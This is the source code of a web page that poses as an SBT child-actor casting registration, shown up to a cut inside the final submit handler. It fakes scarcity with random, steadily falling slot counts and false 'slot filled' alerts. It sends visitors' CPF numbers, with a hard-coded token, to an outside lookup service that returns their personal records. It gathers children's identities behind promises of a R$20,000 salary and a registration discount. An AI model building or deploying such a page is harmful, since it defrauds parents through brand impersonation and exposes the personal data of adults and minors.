import { useState, useEffect } from "react";
import { Link } from "wouter";

interface CepData {
  cep: string;
  logradouro: string;
  complemento: string;
  unidade: string;
  bairro: string;
  localidade: string;
  uf: string;
  estado: string;
  regiao: string;
  ibge: string;
  gia: string;
  ddd: string;
  siafi: string;
  erro?: boolean;
}

export default function Cadastro() {
  const [cep, setCep] = useState("");
  const [loading, setLoading] = useState(false);
  const [vagasDisponiveis, setVagasDisponiveis] = useState<boolean | null>(null);
  const [cidadeInfo, setCidadeInfo] = useState<CepData | null>(null);
  const [cepError, setCepError] = useState("");
  const [quantidadeVagas, setQuantidadeVagas] = useState(Math.floor(Math.random() * (21 - 16 + 1)) + 16);
  const [loadingStep, setLoadingStep] = useState(0);
  const [showProgressiveData, setShowProgressiveData] = useState<Partial<CepData>>({});

  const [showFormulario, setShowFormulario] = useState(false);
  const [cpf, setCpf] = useState("");
  const [nome, setNome] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");
  const [nomeMae, setNomeMae] = useState("");
  const [sexo, setSexo] = useState("");
  const [loadingCpf, setLoadingCpf] = useState(false);
  const [cpfStep, setCpfStep] = useState(0);
  const [grauParentesco, setGrauParentesco] = useState("");
  const [telefone, setTelefone] = useState("");
  const [showDadosCrianca, setShowDadosCrianca] = useState(false);
  const [nomeCrianca, setNomeCrianca] = useState("");
  const [dataNascimentoCrianca, setDataNascimentoCrianca] = useState("");
  const [nomeMaeCrianca, setNomeMaeCrianca] = useState("");
  const [nomePaiCrianca, setNomePaiCrianca] = useState("");
  const [notificacaoVaga, setNotificacaoVaga] = useState("");
  const [cidadeConsultada, setCidadeConsultada] = useState(false);
  const [showTermos, setShowTermos] = useState(false);
  const [termoAutorizacao, setTermoAutorizacao] = useState(false);
  const [termoContrato, setTermoContrato] = useState(false);
  const [termoConfidencialidade, setTermoConfidencialidade] = useState(false);
  const [termoDireitosImagem, setTermoDireitosImagem] = useState(false);
  const [quantidadeCandidatos, setQuantidadeCandidatos] = useState("1");
  const [termosExpandidos, setTermosExpandidos] = useState({
    autorizacao: false,
    contrato: false,
    confidencialidade: false,
    direitos: false
  });
  
  // Estados para múltiplos candidatos
  const [candidatos, setCandidatos] = useState([
    {
      nome: '',
      dataNascimento: '',
      nomeMae: '',
      nomePai: '',
      sexo: ''
    }
  ]);

  const buscarCep = async (cepValue: string) => {
    if (cepValue.length !== 8) return;

    setLoading(true);
    setCepError("");
    setCidadeInfo(null);
    setVagasDisponiveis(null);
    setShowProgressiveData({});
    setLoadingStep(0);
    
    try {
      const response = await fetch(`https://viacep.com.br/ws/${cepValue}/json/`);
      const data: CepData = await response.json();
      
      if (data.erro) {
        setCepError("CEP não encontrado. Verifique e tente novamente.");
        setLoading(false);
        return;
      }

      // Carregamento progressivo em 4 segundos (4 etapas)
      const steps = [
        { cep: data.cep, localidade: data.localidade },
        { ...showProgressiveData, uf: data.uf, estado: data.estado },
        { ...showProgressiveData, regiao: data.regiao, bairro: data.bairro },
        { ...showProgressiveData, logradouro: data.logradouro, ddd: data.ddd }
      ];

      for (let i = 0; i < steps.length; i++) {
        setTimeout(() => {
          setLoadingStep(i + 1);
          setShowProgressiveData(prev => ({ ...prev, ...steps[i] }));
          
          if (i === steps.length - 1) {
            setCidadeInfo(data);
            // Salvar dados da cidade no localStorage para o chat bot
            localStorage.setItem('userCityData', JSON.stringify({
              cidade: data.localidade,
              uf: data.uf,
              estado: data.estado,
              cep: data.cep
            }));
            verificarDisponibilidadeVagas(data);
            setCidadeConsultada(true);
            setLoading(false);
          }
        }, (i + 1) * 1000);
      }
    } catch (error) {
      setCepError("Erro ao consultar CEP. Tente novamente.");
      setLoading(false);
    }
  };

  const verificarDisponibilidadeVagas = (data: CepData) => {
    // Todas as regiões têm vagas disponíveis
    setVagasDisponiveis(true);
    
    // Definir quantidade aleatória de vagas entre 16 e 21
    const vagasAleatorias = Math.floor(Math.random() * (21 - 16 + 1)) + 16;
    setQuantidadeVagas(vagasAleatorias);
  };

  const formatarCep = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 8);
    
    // Aplicar máscara: 00000-000
    if (limitado.length > 5) {
      return `${limitado.slice(0, 5)}-${limitado.slice(5)}`;
    }
    return limitado;
  };

  const formatarCpf = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 11);
    
    // Aplicar máscara: 000.000.000-00
    if (limitado.length > 9) {
      return `${limitado.slice(0, 3)}.${limitado.slice(3, 6)}.${limitado.slice(6, 9)}-${limitado.slice(9)}`;
    } else if (limitado.length > 6) {
      return `${limitado.slice(0, 3)}.${limitado.slice(3, 6)}.${limitado.slice(6)}`;
    } else if (limitado.length > 3) {
      return `${limitado.slice(0, 3)}.${limitado.slice(3)}`;
    }
    return limitado;
  };

  const formatarData = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 8);
    
    // Aplicar máscara: 00/00/0000
    if (limitado.length > 4) {
      return `${limitado.slice(0, 2)}/${limitado.slice(2, 4)}/${limitado.slice(4)}`;
    } else if (limitado.length > 2) {
      return `${limitado.slice(0, 2)}/${limitado.slice(2)}`;
    }
    return limitado;
  };

  const formatarTelefone = (value: string) => {
    const numeros = value.replace(/\D/g, '');
    const limitado = numeros.slice(0, 11);
    
    // Aplicar máscara: (00) 00000-0000 ou (00) 0000-0000
    if (limitado.length > 10) {
      return `(${limitado.slice(0, 2)}) ${limitado.slice(2, 7)}-${limitado.slice(7)}`;
    } else if (limitado.length > 6) {
      return `(${limitado.slice(0, 2)}) ${limitado.slice(2, 6)}-${limitado.slice(6)}`;
    } else if (limitado.length > 2) {
      return `(${limitado.slice(0, 2)}) ${limitado.slice(2)}`;
    }
    return limitado;
  };

  const scrollToSection = (elementId: string) => {
    setTimeout(() => {
      const element = document.getElementById(elementId);
      if (element) {
        element.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }, 100);
  };

  const buscarDadosCpf = async (cpfValue: string) => {
    const cpfNumeros = cpfValue.replace(/\D/g, '');
    if (cpfNumeros.length !== 11) return;

    setLoadingCpf(true);
    setCpfStep(0);
    
    try {
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cpfNumeros}`);
      const data = await response.json();
      
      if (data.DADOS) {
        const dados = data.DADOS;
        
        // Preenchimento gradual em 4 etapas
        const steps = [
          () => setNome(dados.nome),
          () => {
            const dataFormatada = new Date(dados.data_nascimento).toLocaleDateString('pt-BR');
            setDataNascimento(dataFormatada);
          },
          () => setNomeMae(dados.nome_mae),
          () => setSexo(dados.sexo === 'M' ? 'masculino' : 'feminino')
        ];

        for (let i = 0; i < steps.length; i++) {
          setTimeout(() => {
            setCpfStep(i + 1);
            steps[i]();
            
            if (i === steps.length - 1) {
              setLoadingCpf(false);
            }
          }, (i + 1) * 1000);
        }
      }
    } catch (error) {
      console.error('Erro ao buscar dados do CPF:', error);
      setLoadingCpf(false);
    }
  };

  // Limpar dados quando CEP for alterado
  useEffect(() => {
    setCidadeInfo(null);
    setVagasDisponiveis(null);
    setCepError("");
    setShowProgressiveData({});
    setLoadingStep(0);
  }, [cep]);

  // Timer para diminuir vagas a cada 30 segundos
  useEffect(() => {
    const interval = setInterval(() => {
      setQuantidadeVagas(prev => {
        if (prev > 1 && cidadeConsultada) {
          const novaQuantidade = prev - 1;
          // Mostrar notificação de vaga preenchida apenas se cidade foi consultada
          setNotificacaoVaga("1 vaga foi preenchida na sua região");
          setTimeout(() => setNotificacaoVaga(""), 2000); // Remove após 2 segundos
          return novaQuantidade;
        }
        return prev;
      });
    }, 30000); // 30 segundos

    return () => clearInterval(interval);
  }, [cidadeConsultada]);



  // Buscar dados do CPF quando CPF estiver completo
  useEffect(() => {
    const cpfNumeros = cpf.replace(/\D/g, '');
    if (cpfNumeros.length === 11) {
      const timer = setTimeout(() => {
        buscarDadosCpf(cpf);
      }, 500);
      return () => clearTimeout(timer);
    } else {
      // Limpar campos quando CPF for alterado
      setNome("");
      setDataNascimento("");
      setNomeMae("");
      setSexo("");
      setCpfStep(0);
    }
  }, [cpf]);

  return (
    <div className="bg-gray-100 min-h-screen">
      <header className="bg-[#041e41] text-white">
        <div className="p-4 flex justify-between items-center">
          <Link href="/">
            <i className="fas fa-arrow-left text-xl"></i>
          </Link>
          <img alt="SBT logo" className="h-12" src="/attached_assets/sbt_logo.png" width="auto"/>
          <div className="w-6"></div>
        </div>
      </header>

      <main className="container mx-auto p-4 max-w-2xl">
        <div className="bg-white p-6 rounded-lg shadow-md">
          <h1 className="text-2xl font-bold mb-4 text-center">
            Cadastro para Seleção de Atores Mirins
          </h1>
          
          <div className="mb-6">
            <div className="flex items-center justify-center mb-4">
              <div className="w-8 h-8 bg-blue-500 text-white rounded-full flex items-center justify-center text-sm font-bold mr-2">
                1
              </div>
              <span className="text-sm font-medium">Verificação de Disponibilidade</span>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Digite seu CEP para verificar se há vagas disponíveis em sua região:
              </label>
              <div className="flex gap-2">
                <div className="relative flex-1">
                  <input
                    type="text"
                    value={cep}
                    onChange={(e) => setCep(formatarCep(e.target.value))}
                    placeholder="00000-000"
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    maxLength={9}
                  />
                  {loading && (
                    <div className="absolute right-3 top-2">
                      <i className="fas fa-spinner fa-spin text-blue-500"></i>
                    </div>
                  )}
                </div>
                <button
                  onClick={() => {
                    const cepNumeros = cep.replace(/\D/g, '');
                    if (cepNumeros.length === 8) {
                      buscarCep(cepNumeros);
                    }
                  }}
                  disabled={loading || cep.replace(/\D/g, '').length !== 8}
                  className="px-3 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600 disabled:bg-gray-400 disabled:cursor-not-allowed transition duration-200 flex items-center justify-center"
                >
                  <i className="fas fa-search"></i>
                </button>
              </div>
              {cepError && (
                <p className="text-red-500 text-sm mt-1">{cepError}</p>
              )}
            </div>

            {(loading || Object.keys(showProgressiveData).length > 0) && (
              <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <h3 className="font-medium text-blue-800 mb-2">
                  <i className="fas fa-map-marker-alt mr-2"></i>
                  {loading ? "Carregando localização..." : "Localização encontrada:"}
                </h3>
                <div className="space-y-1 text-sm text-blue-700">
                  {loadingStep >= 1 && (
                    <>
                      <p><strong>CEP:</strong> {showProgressiveData.cep}</p>
                      <p><strong>Cidade:</strong> {showProgressiveData.localidade}</p>
                    </>
                  )}
                  {loadingStep >= 2 && showProgressiveData.uf && (
                    <>
                      <p><strong>UF:</strong> {showProgressiveData.uf}</p>
                      <p><strong>Estado:</strong> {showProgressiveData.estado}</p>
                    </>
                  )}
                  {loadingStep >= 3 && showProgressiveData.regiao && (
                    <>
                      <p><strong>Região:</strong> {showProgressiveData.regiao}</p>
                      {showProgressiveData.bairro && (
                        <p><strong>Bairro:</strong> {showProgressiveData.bairro}</p>
                      )}
                    </>
                  )}
                  {loadingStep >= 4 && (
                    <>
                      {showProgressiveData.logradouro && (
                        <p><strong>Logradouro:</strong> {showProgressiveData.logradouro}</p>
                      )}
                      <p><strong>DDD:</strong> {showProgressiveData.ddd}</p>
                    </>
                  )}
                  {loading && (
                    <div className="flex items-center mt-2">
                      <div className="w-full bg-gray-200 rounded-full h-2">
                        <div 
                          className="bg-blue-600 h-2 rounded-full transition-all duration-1000"
                          style={{ width: `${(loadingStep / 4) * 100}%` }}
                        ></div>
                      </div>
                      <span className="ml-2 text-xs">{loadingStep}/4</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {vagasDisponiveis === true && (
              <div className="mt-6 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                <div className="flex items-center">
                  <i className="fas fa-check-circle text-green-500 mr-2"></i>
                  <h3 className="font-medium text-black">Ótimas notícias!</h3>
                </div>
                <p className="text-sm text-black mt-1">
                  Há vagas disponíveis para sua região. Você pode prosseguir com o cadastro.
                </p>
                <div className="flex items-center mt-2 mb-3">
                  <div className="w-2 h-2 bg-red-500 rounded-full mr-2 animate-pulse"></div>
                  <span className="text-sm font-medium text-black">
                    Existem {quantidadeVagas} vagas disponíveis
                  </span>
                </div>
                

                <button 
                  onClick={() => {
                    setShowFormulario(true);
                    scrollToSection('formulario-responsavel');
                  }}
                  className="mt-3 px-4 py-2 bg-blue-500 text-white rounded-md hover:bg-blue-600 transition duration-200"
                >
                  Continuar Cadastro
                </button>
              </div>
            )}



            {showFormulario && (
              <div id="formulario-responsavel" className="mt-6 p-6 bg-white border border-gray-200 rounded-lg">
                <h3 className="font-semibold text-black text-lg mb-4">Dados do Responsável Legal</h3>
                
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      CPF do Responsável Legal:
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        value={cpf}
                        onChange={(e) => setCpf(formatarCpf(e.target.value))}
                        placeholder="000.000.000-00"
                        className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        maxLength={14}
                      />
                      {loadingCpf && (
                        <div className="absolute right-3 top-2">
                          <i className="fas fa-spinner fa-spin text-blue-500"></i>
                        </div>
                      )}
                    </div>
                    {loadingCpf && (
                      <div className="mt-2">
                        <div className="flex items-center text-xs text-blue-600">
                          <div className="w-full bg-gray-200 rounded-full h-1">
                            <div 
                              className="bg-blue-600 h-1 rounded-full transition-all duration-1000"
                              style={{ width: `${(cpfStep / 4) * 100}%` }}
                            ></div>
                          </div>
                          <span className="ml-2">{cpfStep}/4</span>
                        </div>
                        <p className="text-xs text-gray-600 mt-1">Buscando dados automaticamente...</p>
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nome Completo:
                    </label>
                    <input
                      type="text"
                      value={nome}
                      onChange={(e) => setNome(e.target.value)}
                      placeholder="Digite o nome completo"
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 1 ? 'bg-green-50 border-green-300' : ''}`}
                      readOnly={loadingCpf}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Data de Nascimento:
                    </label>
                    <input
                      type="text"
                      value={dataNascimento}
                      onChange={(e) => setDataNascimento(formatarData(e.target.value))}
                      placeholder="00/00/0000"
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 2 ? 'bg-green-50 border-green-300' : ''}`}
                      maxLength={10}
                      readOnly={loadingCpf}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nome da Mãe:
                    </label>
                    <input
                      type="text"
                      value={nomeMae}
                      onChange={(e) => setNomeMae(e.target.value)}
                      placeholder="Digite o nome completo da mãe"
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 3 ? 'bg-green-50 border-green-300' : ''}`}
                      readOnly={loadingCpf}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Sexo:
                    </label>
                    <select
                      value={sexo}
                      onChange={(e) => setSexo(e.target.value)}
                      className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${cpfStep >= 4 ? 'bg-green-50 border-green-300' : ''}`}
                      disabled={loadingCpf}
                    >
                      <option value="">Selecione o sexo</option>
                      <option value="masculino">Masculino</option>
                      <option value="feminino">Feminino</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Quantos candidatos deseja inscrever? *
                    </label>
                    <select
                      value={quantidadeCandidatos}
                      onChange={(e) => {
                        const novaQuantidade = parseInt(e.target.value);
                        setQuantidadeCandidatos(e.target.value);
                        
                        // Ajustar array de candidatos
                        const novosCandidatos = Array.from({ length: novaQuantidade }, (_, index) => 
                          candidatos[index] || {
                            nome: '',
                            dataNascimento: '',
                            nomeMae: '',
                            nomePai: '',
                            sexo: ''
                          }
                        );
                        setCandidatos(novosCandidatos);
                      }}
                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    >
                      <option value="1">1 candidato</option>
                      <option value="2">2 candidatos</option>
                      <option value="3">3 candidatos</option>
                      <option value="4">4 candidatos</option>
                      <option value="5">5 candidatos</option>
                    </select>
                    <p className="text-xs text-gray-600 mt-1">
                      * Cada candidato precisará de cadastro individual
                    </p>
                    
                    {/* Incentivo para múltiplos candidatos */}
                    {parseInt(quantidadeCandidatos) >= 2 && (
                      <div className="mt-3 p-3 bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-md">
                        <div className="flex items-center">
                          <div className="flex-shrink-0">
                            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                              <i className="fas fa-percentage text-white text-xs"></i>
                            </div>
                          </div>
                          <div className="ml-2">
                            <span className="text-green-800 font-medium text-xs">
                              O SBT oferece 50% de desconto na inscrição • {quantidadeCandidatos} candidatos
                            </span>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Telefone de Contato:
                    </label>
                    <input
                      type="text"
                      value={telefone}
                      onChange={(e) => setTelefone(formatarTelefone(e.target.value))}
                      placeholder="(00) 00000-0000"
                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      maxLength={15}
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Grau de Parentesco com a Criança:
                    </label>
                    <select
                      value={grauParentesco}
                      onChange={(e) => {
                        const novoGrau = e.target.value;
                        setGrauParentesco(novoGrau);
                        
                        // Preencher automaticamente os campos da criança baseado no grau de parentesco
                        if (novoGrau === 'pai' && nome) {
                          setNomePaiCrianca(nome);
                        } else if (novoGrau === 'mae' && nome) {
                          setNomeMaeCrianca(nome);
                        }
                      }}
                      className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    >
                      <option value="">Selecione o grau de parentesco</option>
                      <option value="pai">Pai</option>
                      <option value="mae">Mãe</option>
                      <option value="avo">Avô</option>
                      <option value="ava">Avó</option>
                      <option value="tio">Tio</option>
                      <option value="tia">Tia</option>
                      <option value="tutor">Tutor Legal</option>
                      <option value="responsavel">Responsável Legal</option>
                    </select>
                  </div>

                  {/* Botão para continuar para dados da criança */}
                  <div className="mt-6">
                    <button 
                      onClick={() => {
                        setShowDadosCrianca(true);
                        setTimeout(() => scrollToSection('dados-crianca'), 500);
                      }}
                      className="w-full px-4 py-3 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition duration-200 font-medium"
                    >
                      Continuar para Dados da Criança
                    </button>
                  </div>


                </div>
              </div>
            )}



            {showDadosCrianca && (
              <div id="dados-crianca" className="mt-6 space-y-6">
                {Array.from({ length: parseInt(quantidadeCandidatos) }, (_, index) => (
                  <div key={index} className="p-6 bg-white border border-gray-200 rounded-lg">
                    <h3 className="font-semibold text-black text-lg mb-4">
                      {parseInt(quantidadeCandidatos) === 1 
                        ? "Dados do Candidato Menor" 
                        : `Dados do Candidato Menor ${index + 1}`
                      }
                    </h3>
                    
                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Nome Completo da Criança:
                        </label>
                        <input
                          type="text"
                          value={candidatos[index]?.nome || ''}
                          onChange={(e) => {
                            const novosCandidatos = [...candidatos];
                            if (!novosCandidatos[index]) {
                              novosCandidatos[index] = { nome: '', dataNascimento: '', nomeMae: '', nomePai: '' };
                            }
                            novosCandidatos[index].nome = e.target.value;
                            setCandidatos(novosCandidatos);
                            
                            // Manter compatibilidade com o primeiro candidato
                            if (index === 0) setNomeCrianca(e.target.value);
                          }}
                          placeholder="Digite o nome completo da criança"
                          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        />
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Data de Nascimento da Criança:
                        </label>
                        <input
                          type="text"
                          value={candidatos[index]?.dataNascimento || ''}
                          onChange={(e) => {
                            const dataFormatada = formatarData(e.target.value);
                            const novosCandidatos = [...candidatos];
                            if (!novosCandidatos[index]) {
                              novosCandidatos[index] = { nome: '', dataNascimento: '', nomeMae: '', nomePai: '', sexo: '' };
                            }
                            novosCandidatos[index].dataNascimento = dataFormatada;
                            setCandidatos(novosCandidatos);
                            
                            // Manter compatibilidade com o primeiro candidato
                            if (index === 0) setDataNascimentoCrianca(dataFormatada);
                          }}
                          placeholder="00/00/0000"
                          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                          maxLength={10}
                        />
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Nome da Mãe da Criança:
                        </label>
                        <input
                          type="text"
                          value={candidatos[index]?.nomeMae || ''}
                          onChange={(e) => {
                            const novosCandidatos = [...candidatos];
                            if (!novosCandidatos[index]) {
                              novosCandidatos[index] = { nome: '', dataNascimento: '', nomeMae: '', nomePai: '', sexo: '' };
                            }
                            novosCandidatos[index].nomeMae = e.target.value;
                            setCandidatos(novosCandidatos);
                            
                            // Manter compatibilidade com o primeiro candidato
                            if (index === 0) setNomeMaeCrianca(e.target.value);
                          }}
                          placeholder="Digite o nome completo da mãe"
                          className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${grauParentesco === 'mae' && candidatos[index]?.nomeMae ? 'bg-green-50 border-green-300' : ''}`}
                        />
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Nome do Pai da Criança:
                        </label>
                        <input
                          type="text"
                          value={candidatos[index]?.nomePai || ''}
                          onChange={(e) => {
                            const novosCandidatos = [...candidatos];
                            if (!novosCandidatos[index]) {
                              novosCandidatos[index] = { nome: '', dataNascimento: '', nomeMae: '', nomePai: '', sexo: '' };
                            }
                            novosCandidatos[index].nomePai = e.target.value;
                            setCandidatos(novosCandidatos);
                            
                            // Manter compatibilidade com o primeiro candidato
                            if (index === 0) setNomePaiCrianca(e.target.value);
                          }}
                          placeholder="Digite o nome completo do pai"
                          className={`w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${grauParentesco === 'pai' && candidatos[index]?.nomePai ? 'bg-green-50 border-green-300' : ''}`}
                        />
                      </div>

                      <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">
                          Sexo da Criança:
                        </label>
                        <select
                          value={candidatos[index]?.sexo || ''}
                          onChange={(e) => {
                            const novosCandidatos = [...candidatos];
                            if (!novosCandidatos[index]) {
                              novosCandidatos[index] = { nome: '', dataNascimento: '', nomeMae: '', nomePai: '', sexo: '' };
                            }
                            novosCandidatos[index].sexo = e.target.value;
                            setCandidatos(novosCandidatos);
                          }}
                          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        >
                          <option value="">Selecione o sexo</option>
                          <option value="masculino">Masculino</option>
                          <option value="feminino">Feminino</option>
                        </select>
                      </div>
                    </div>
                  </div>
                ))}

                {/* Seção de Termos de Autorização */}
                <div className="mt-8 p-6 bg-white border border-gray-300 rounded-lg">
                  <h3 className="font-semibold text-gray-800 text-lg mb-4">Termos de Autorização e Ciência</h3>
                  <p className="text-gray-600 text-sm mb-6">Leia e aceite todos os termos abaixo para finalizar o cadastro</p>
                  
                  <div className="space-y-4">
                    {/* Termo de Autorização do Menor */}
                    <div className="p-4 bg-gray-50 border border-gray-200 rounded-md">
                      <div className="flex items-start">
                        <input
                          type="checkbox"
                          checked={termoAutorizacao}
                          onChange={(e) => setTermoAutorizacao(e.target.checked)}
                          className="mt-1 mr-3 w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                        />
                        <div className="flex-1 text-sm text-gray-700">
                          <strong className="text-gray-800">Termo de Autorização do Menor</strong>
                          <p className="mt-1 leading-relaxed">
                            {termosExpandidos.autorizacao 
                              ? "Autorizo a participação do menor citado neste cadastro no processo seletivo e, em caso de aprovação, na gravação da novela. Declaro ser responsável legal pelo menor e ter plenos poderes para esta autorização."
                              : (
                                <span>
                                  Autorizo a participação... {' '}
                                  <button
                                    type="button"
                                    onClick={() => setTermosExpandidos(prev => ({ ...prev, autorizacao: !prev.autorizacao }))}
                                    className="text-blue-600 hover:text-blue-800 text-xs font-medium underline"
                                  >
                                    Ver mais
                                  </button>
                                </span>
                              )
                            }
                          </p>
                          {termosExpandidos.autorizacao && (
                            <button
                              type="button"
                              onClick={() => setTermosExpandidos(prev => ({ ...prev, autorizacao: !prev.autorizacao }))}
                              className="text-blue-600 hover:text-blue-800 text-xs font-medium mt-1"
                            >
                              Ver menos
                            </button>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Termo de Ciência de Contrato */}
                    <div className="p-4 bg-gray-50 border border-gray-200 rounded-md">
                      <div className="flex items-start">
                        <input
                          type="checkbox"
                          checked={termoContrato}
                          onChange={(e) => setTermoContrato(e.target.checked)}
                          className="mt-1 mr-3 w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                        />
                        <div className="flex-1 text-sm text-gray-700">
                          <strong className="text-gray-800">Termo de Ciência de Contrato</strong>
                          <p className="mt-1 leading-relaxed">
                            {termosExpandidos.contrato 
                              ? "Estou ciente de que, em caso de aprovação, o menor ficará vinculado a um contrato de 1 (um) ano ou mais com o SBT, conforme necessidades da produção, com salário de R$ 20.000,00 mensais."
                              : (
                                <span>
                                  Estou ciente de que, em caso de aprovação... {' '}
                                  <button
                                    type="button"
                                    onClick={() => setTermosExpandidos(prev => ({ ...prev, contrato: !prev.contrato }))}
                                    className="text-blue-600 hover:text-blue-800 text-xs font-medium underline"
                                  >
                                    Ver mais
                                  </button>
                                </span>
                              )
                            }
                          </p>
                          {termosExpandidos.contrato && (
                            <button
                              type="button"
                              onClick={() => setTermosExpandidos(prev => ({ ...prev, contrato: !prev.contrato }))}
                              className="text-blue-600 hover:text-blue-800 text-xs font-medium mt-1"
                            >
                              Ver menos
                            </button>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Termo de Confidencialidade */}
                    <div className="p-4 bg-gray-50 border border-gray-200 rounded-md">
                      <div className="flex items-start">
                        <input
                          type="checkbox"
                          checked={termoConfidencialidade}
                          onChange={(e) => setTermoConfidencialidade(e.target.checked)}
                          className="mt-1 mr-3 w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                        />
                        <div className="flex-1 text-sm text-gray-700">
                          <strong className="text-gray-800">Termo de Confidencialidade</strong>
                          <p className="mt-1 leading-relaxed">
                            {termosExpandidos.confidencialidade 
                              ? "Comprometo-me a manter sigilo absoluto sobre roteiros, tramas, informações privilegiadas e demais conteúdos relacionados à produção, sob pena de responsabilização civil e criminal."
                              : (
                                <span>
                                  Comprometo-me a manter sigilo absoluto... {' '}
                                  <button
                                    type="button"
                                    onClick={() => setTermosExpandidos(prev => ({ ...prev, confidencialidade: !prev.confidencialidade }))}
                                    className="text-blue-600 hover:text-blue-800 text-xs font-medium underline"
                                  >
                                    Ver mais
                                  </button>
                                </span>
                              )
                            }
                          </p>
                          {termosExpandidos.confidencialidade && (
                            <button
                              type="button"
                              onClick={() => setTermosExpandidos(prev => ({ ...prev, confidencialidade: !prev.confidencialidade }))}
                              className="text-blue-600 hover:text-blue-800 text-xs font-medium mt-1"
                            >
                              Ver menos
                            </button>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Termo de Direitos de Imagem */}
                    <div className="p-4 bg-gray-50 border border-gray-200 rounded-md">
                      <div className="flex items-start">
                        <input
                          type="checkbox"
                          checked={termoDireitosImagem}
                          onChange={(e) => setTermoDireitosImagem(e.target.checked)}
                          className="mt-1 mr-3 w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                        />
                        <div className="flex-1 text-sm text-gray-700">
                          <strong className="text-gray-800">Termo de Direitos Autorais de Imagem</strong>
                          <p className="mt-1 leading-relaxed">
                            {termosExpandidos.direitos 
                              ? "Autorizo o uso da imagem, voz e performance do menor em todos os meios de comunicação, incluindo TV, streaming, redes sociais e materiais promocionais, sem limitação de tempo ou território."
                              : (
                                <span>
                                  Autorizo o uso da imagem, voz e performance... {' '}
                                  <button
                                    type="button"
                                    onClick={() => setTermosExpandidos(prev => ({ ...prev, direitos: !prev.direitos }))}
                                    className="text-blue-600 hover:text-blue-800 text-xs font-medium underline"
                                  >
                                    Ver mais
                                  </button>
                                </span>
                              )
                            }
                          </p>
                          {termosExpandidos.direitos && (
                            <button
                              type="button"
                              onClick={() => setTermosExpandidos(prev => ({ ...prev, direitos: !prev.direitos }))}
                              className="text-blue-600 hover:text-blue-800 text-xs font-medium mt-1"
                            >
                              Ver menos
                            </button>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* Botão de Finalizar Cadastro */}
                    <div className="mt-6 pt-4 border-t border-gray-200">
                      <button 
                        disabled={!(termoAutorizacao && termoContrato && termoConfidencialidade && termoDireitosImagem)}
                        onClick={() => {
